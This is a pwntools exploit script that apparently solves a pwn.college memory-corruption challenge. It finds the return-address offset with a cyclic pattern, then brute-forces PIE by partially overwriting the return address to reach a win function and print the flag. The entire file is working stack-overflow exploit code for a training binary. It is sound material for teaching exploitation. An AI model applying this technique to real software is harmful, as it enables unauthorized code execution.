#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level7.0')
io = elf.process(setuid=False)

# Send the payload size to the program in order 
# to compute the buffer size
io.recvuntil(b'Payload size: ')
io.sendline(f"{512}".encode())

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.recvuntil(b'bytes)!')
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes at every time execution.
while True:
    # Run another program
    io = elf.process()

    # Send the payload size to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_length + 2}".encode())

    # Set the first two bytes to use in the return address
    win_address = b"\x57\x1b"

    # Build and send the payload to the program
    PAYLOAD = b'A'*buffer_length + win_address
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if 'pwn.college' in flag:
        print(flag)
        break
